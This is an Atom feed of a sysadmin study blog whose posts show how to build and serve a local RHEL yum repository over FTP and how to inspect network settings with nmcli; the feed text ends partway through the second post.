<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-01-17T13:27:56-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Creating custom yum repositories]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories/"/>
    <updated>2018-01-17T13:21:03-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories</id>
    <content type="html"><![CDATA[<p>Setting up a local package repository is useful when you need to save bandwidth or you won&rsquo;t have access to internet. In this post we&rsquo;ll set up a local yum repository from the DVD source, install vsftpd from it, and then host the repository over FTP.</p>

<!-- more -->


<h2>Making a local repository from DVD</h2>

<p>I made a <strong>/mnt/cdrom</strong> directory where I can mount the DVD. Then check what you have in the drive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blkid /dev/sr0
</span><span class='line'>/dev/sr0: UUID="2016-10-19-18-32-06-00" LABEL="RHEL-7.3 Server.x86_64" TYPE="iso9660" PTTYPE="dos"</span></code></pre></td></tr></table></div></figure>


<p>Mount the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t iso9660 -o ro /dev/sr0 /mnt/cdrom</span></code></pre></td></tr></table></div></figure>


<p>Copy the packages on the DVD to a directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir -p /mnt/repos
</span><span class='line'>cp -rpv /mnt/cdrom/Packages/ /mnt/repos/rhel7</span></code></pre></td></tr></table></div></figure>


<p>Grab a cofee, this will take a while. When it&rsquo;s finished, create the repo from all the RPMS you copied:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>createrepo /mnt/repos/rhel7
</span><span class='line'>Spawning worker 0 with 4751 pkgs
</span><span class='line'>Workers Finished
</span><span class='line'>Saving Primary metadata
</span><span class='line'>Saving file lists metadata
</span><span class='line'>Saving other metadata
</span><span class='line'>Generating sqlite DBs
</span><span class='line'>Sqlite DBs complete</span></code></pre></td></tr></table></div></figure>


<p>Next, we need to create a conf file for the repo. These files should be placed in <code>/etc/yum.repos.d</code> and be of the format <em>name.repo</em>. For a listing of the repository options that you can set, see the <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sec-configuring_yum_and_yum_repositories#sec-Setting_repository_Options">RedHat documentation</a></p>

<p>I defined a repo file that looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/rhel7-local.repo 
</span><span class='line'>[rhel7-local]
</span><span class='line'>name=Local RHEL7 repository
</span><span class='line'>baseurl=file:///mnt/repos/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>[name] &ndash; this is a unique repository ID, and it should contain no spaces</p></li>
<li><p>name &ndash; a description of the repository</p></li>
<li><p>baseurl &ndash; location of the repository data. For local files: <code>file:///path/to/local/repo</code>. For <a href="HTTP:">HTTP:</a> <code><a href="http://path/to/repo">http://path/to/repo</a></code>. And for <a href="FTP:">FTP:</a> <code><a href="ftp://path/to/repo">ftp://path/to/repo</a></code></p></li>
<li><p>enabled &ndash; this 0 or 1 value specifies whether the repository is used by yum or not</p></li>
<li><p>gpgcheck &ndash; this 0 or 1 value specifies if yum will do a GPG signature check on the packages</p></li>
</ul>


<p>I cleared the yum cache and checked that my repo has been enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum clean all
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Cleaning repos: rhel-7-server-rpms rhel-7-server-rt-beta-rpms rhel-7-server-rt-rpms rhel7-local
</span><span class='line'>Cleaning up everything
</span><span class='line'>yum repolist enabled | grep rhel7-local
</span><span class='line'>rhel7-local                          Local RHEL7 repository               4,751</span></code></pre></td></tr></table></div></figure>


<h2>Install vsftpd from local repo</h2>

<p>I disabled the other repositories and installed vsftpd from my local one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y vsftpd
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Resolving Dependencies
</span><span class='line'>--&gt; Running transaction check
</span><span class='line'>---&gt; Package vsftpd.x86_64 0:3.0.2-21.el7 will be installed
</span><span class='line'>--&gt; Finished Dependency Resolution
</span><span class='line'>
</span><span class='line'>Dependencies Resolved
</span><span class='line'>
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'> Package                               Arch                                  Version                                        Repository                                  Size
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Installing:
</span><span class='line'> vsftpd                                x86_64                                3.0.2-21.el7                                   rhel7-local                                169 k
</span><span class='line'>
</span><span class='line'>Transaction Summary
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Install  1 Package
</span><span class='line'>
</span><span class='line'>Total download size: 169 k
</span><span class='line'>Installed size: 348 k
</span><span class='line'>Downloading packages:
</span><span class='line'>Running transaction check
</span><span class='line'>Running transaction test
</span><span class='line'>Transaction test succeeded
</span><span class='line'>Running transaction
</span><span class='line'>  Installing : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>  Verifying  : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>
</span><span class='line'>Installed:
</span><span class='line'>  vsftpd.x86_64 0:3.0.2-21.el7                                                                                                                                               
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>


<p>Start the FTP service and see that it&rsquo;s running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start vsftpd && systemctl status vsftpd
</span><span class='line'>● vsftpd.service - Vsftpd ftp daemon
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Mon 2018-01-15 15:21:54 EET; 35ms ago
</span><span class='line'>  Process: 6025 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS)
</span><span class='line'> Main PID: 6026 (vsftpd)
</span><span class='line'>   CGroup: /system.slice/vsftpd.service
</span><span class='line'>           └─6026 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
</span><span class='line'>
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Starting Vsftpd ftp daemon...
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Started Vsftpd ftp daemon.</span></code></pre></td></tr></table></div></figure>


<p>If you have firewalld running, you have to allow vsftpd. First, chech the default zone:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<p>Check if FTP is allowed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>no</span></code></pre></td></tr></table></div></figure>


<p>Add a rule to allow <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=public --add-service=ftp --permanent
</span><span class='line'>success</span></code></pre></td></tr></table></div></figure>


<p>Restart the firewall and check again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>yes</span></code></pre></td></tr></table></div></figure>


<p>Next, I copied the repository to the FTP folder in <code>/var/ftp/pub</code> and changed the ownership to <a href="ftp:">ftp:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp -r /mnt/repos/rhel7/ /var/ftp/pub/rhel7
</span><span class='line'>chown -R ftp:ftp /var/ftp/pub/rhel7/</span></code></pre></td></tr></table></div></figure>


<p>Check the SELinux context:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /var/ftp/pub/
</span><span class='line'>dr-xr-xr-x. ftp ftp unconfined_u:object_r:public_content_t:s0 rhel7</span></code></pre></td></tr></table></div></figure>


<p>And to see if everything works, FTP anonymously to the server and list the files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp localhost
</span><span class='line'>Trying ::1...
</span><span class='line'>Connected to localhost (::1).
</span><span class='line'>220 (vsFTPd 3.0.2)
</span><span class='line'>Name (localhost:root): anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; ls
</span><span class='line'>229 Entering Extended Passive Mode (|||43989|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    3 0        0              19 Jan 15 13:47 pub
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; ls pub
</span><span class='line'>229 Entering Extended Passive Mode (|||35006|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>dr-xr-xr-x    3 14       50         258048 Jan 15 13:49 rhel7</span></code></pre></td></tr></table></div></figure>


<p>Now you can create another repo file like before, but this time served over <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/ftp-rhel7.repo 
</span><span class='line'>[ftp-rhel7]
</span><span class='line'>name=RHEL7 repository FTP
</span><span class='line'>baseurl=ftp://127.0.0.1/pub/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<p>I disabled the local repository and only kept the FTP one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum repolist
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>ftp-rhel7                                                                                                                | 2.9 kB  00:00:00     
</span><span class='line'>ftp-rhel7/primary_db                                                                                                     | 3.8 MB  00:00:00     
</span><span class='line'>repo id                                                        repo name                                                                  status
</span><span class='line'>ftp-rhel7                                                      RHEL7 repository FTP                                                       4,751
</span><span class='line'>repolist: 4,751</span></code></pre></td></tr></table></div></figure>


<p>Install something to see it work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y squid
</span><span class='line'>[...]
</span><span class='line'>Installed:
</span><span class='line'>  squid.x86_64 7:3.5.20-2.el7                                                                                                                   
</span><span class='line'>
</span><span class='line'>Dependency Installed:
</span><span class='line'>  libecap.x86_64 0:1.0.0-1.el7                          perl-Digest.noarch 0:1.17-245.el7          perl-Digest-MD5.x86_64 0:2.52-3.el7         
</span><span class='line'>  squid-migration-script.x86_64 7:3.5.20-2.el7         
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Don't get stuck in a closet -- wear \
</span><span class='line'>\ yourself out.                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - NetworkManager configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration/"/>
    <updated>2018-01-11T13:31:50-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look over configuring various network settings with <strong>nmcli</strong>, the command line tool for NetworkManager.</p>

<!-- more -->


<p>The first step is to understand how network configuration settings look. Inside the <code>/etc/sysconfig/network-scripts/</code> directory, you can find config files for your network interfaces, under the format of <strong>ifcfg-name</strong>. On my system, it looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat ifcfg-Wired_connection_1 
</span><span class='line'>HWADDR=00:0C:29:47:D7:A8
</span><span class='line'>TYPE=Ethernet
</span><span class='line'>BOOTPROTO=dhcp
</span><span class='line'>DEFROUTE=yes
</span><span class='line'>IPV4_FAILURE_FATAL=no
</span><span class='line'>IPV6INIT=yes
</span><span class='line'>IPV6_AUTOCONF=yes
</span><span class='line'>IPV6_DEFROUTE=yes
</span><span class='line'>IPV6_FAILURE_FATAL=no
</span><span class='line'>IPV6_ADDR_GEN_MODE=stable-privacy
</span><span class='line'>NAME="Wired connection 1"
</span><span class='line'>UUID=8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>ONBOOT=yes
</span><span class='line'>DNS1=8.8.8.8
</span><span class='line'>PEERDNS=yes
</span><span class='line'>PEERROUTES=yes
</span><span class='line'>IPV6_PEERDNS=yes
</span><span class='line'>IPV6_PEERROUTES=yes</span></code></pre></td></tr></table></div></figure>


<p>You can find a more complete overview of the options at <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html">https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html</a> , but from a glance at this file, we see the interface is an Ethernet device, it uses DHCP, it&rsquo;s set as the default route for both IPv4 and IPv6 traffic, it&rsquo;s activated at boot time, and also some other details like its MAC address and name.</p>

<p>nmcli is a very powerful tool, and you can press Tab to see options for its use at every stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli help
</span><span class='line'>Usage: nmcli [OPTIONS] OBJECT { COMMAND | help }
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>  -t[erse]                                   terse output
</span><span class='line'>  -p[retty]                                  pretty output
</span><span class='line'>  -m[ode] tabular|multiline                  output mode
</span><span class='line'>  -c[olors] auto|yes|no                      whether to use colors in output
</span><span class='line'>  -f[ields] &lt;field1,field2,...&gt;|all|common   specify fields to output
</span><span class='line'>  -e[scape] yes|no                           escape columns separators in values
</span><span class='line'>  -a[sk]                                     ask for missing parameters
</span><span class='line'>  -s[how-secrets]                            allow displaying passwords
</span><span class='line'>  -w[ait] &lt;seconds&gt;                          set timeout waiting for finishing operations
</span><span class='line'>  -v[ersion]                                 show program version
</span><span class='line'>  -h[elp]                                    print this help
</span><span class='line'>
</span><span class='line'>OBJECT
</span><span class='line'>  g[eneral]       NetworkManager's general status and operations
</span><span class='line'>  n[etworking]    overall networking control
</span><span class='line'>  r[adio]         NetworkManager radio switches
</span><span class='line'>  c[onnection]    NetworkManager's connections
</span><span class='line'>  d[evice]        devices managed by NetworkManager
</span><span class='line'>  a[gent]         NetworkManager secret agent or polkit agent
</span><span class='line'>  m[onitor]       monitor NetworkManager changes</span></code></pre></td></tr></table></div></figure>


<p>Here we will go over a few examples:</p>

<h2>Device options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli device help
</span><span class='line'>Usage: nmcli device { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { status | show | set | connect | reapply | modify | disconnect | delete | monitor | wifi | lldp }
</span><span class='line'>
</span><span class='line'>  status
</span><span class='line'>
</span><span class='line'>  show [&lt;ifname&gt;]
</span><span class='line'>
</span><span class='line'>  set [ifname] &lt;ifname&gt; [autoconnect yes|no] [managed yes|no]
</span><span class='line'>
</span><span class='line'>  connect &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  reapply &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  modify &lt;ifname&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  disconnect &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  delete &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  monitor &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  wifi [list [ifname &lt;ifname&gt;] [bssid &lt;BSSID&gt;]]
</span><span class='line'>
</span><span class='line'>  wifi connect &lt;(B)SSID&gt; [password &lt;password&gt;] [wep-key-type key|phrase] [ifname &lt;ifname&gt;]
</span><span class='line'>                         [bssid &lt;BSSID&gt;] [name &lt;name&gt;] [private yes|no] [hidden yes|no]
</span><span class='line'>
</span><span class='line'>  wifi hotspot [ifname &lt;ifname&gt;] [con-name &lt;name&gt;] [ssid &lt;SSID&gt;] [band a|bg] [channel &lt;channel&gt;] [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>  wifi rescan [ifname &lt;ifname&gt;] [[ssid &lt;SSID to scan&gt;] ...]
</span><span class='line'>
</span><span class='line'>  lldp [list [ifname &lt;ifname&gt;]]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show device status</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev status
</span><span class='line'>DEVICE      TYPE      STATE      CONNECTION         
</span><span class='line'>virbr0      bridge    connected  virbr0             
</span><span class='line'>enp0s3      ethernet  connected  Wired connection 1 
</span><span class='line'>lo          loopback  unmanaged  --                 
</span><span class='line'>virbr0-nic  tun       unmanaged  --          </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list device details</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev show enp0s3 
</span><span class='line'>GENERAL.DEVICE:                         enp0s3
</span><span class='line'>GENERAL.TYPE:                           ethernet
</span><span class='line'>GENERAL.HWADDR:                         00:0C:29:47:D7:A8
</span><span class='line'>GENERAL.MTU:                            1500
</span><span class='line'>GENERAL.STATE:                          100 (connected)
</span><span class='line'>GENERAL.CONNECTION:                     Wired connection 1
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>WIRED-PROPERTIES.CARRIER:               on
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<h2>Connection options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con help
</span><span class='line'>Usage: nmcli connection { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { show | up | down | add | modify | clone | edit | delete | monitor | reload | load | import | export }
</span><span class='line'>
</span><span class='line'>  show [--active] [--order &lt;order spec&gt;]
</span><span class='line'>  show [--active] [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  up [[id | uuid | path] &lt;ID&gt;] [ifname &lt;ifname&gt;] [ap &lt;BSSID&gt;] [passwd-file &lt;file with passwords&gt;]
</span><span class='line'>
</span><span class='line'>  down [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  add COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  modify [--temporary] [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  clone [--temporary] [id | uuid | path ] &lt;ID&gt; &lt;new name&gt;
</span><span class='line'>
</span><span class='line'>  edit [id | uuid | path] &lt;ID&gt;
</span><span class='line'>  edit [type &lt;new_con_type&gt;] [con-name &lt;new_con_name&gt;]
</span><span class='line'>
</span><span class='line'>  delete [id | uuid | path] &lt;ID&gt;
</span><span class='line'>
</span><span class='line'>  monitor [id | uuid | path] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  reload
</span><span class='line'>
</span><span class='line'>  load &lt;filename&gt; [ &lt;filename&gt;... ]
</span><span class='line'>
</span><span class='line'>  import [--temporary] type &lt;type&gt; file &lt;file to import&gt;
</span><span class='line'>
</span><span class='line'>  export [id | uuid | path] &lt;ID&gt; [&lt;output file&gt;] </span></code></pre></td></tr></table></div></figure>


<ul>
<li>look at the available connections and list only the active ones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
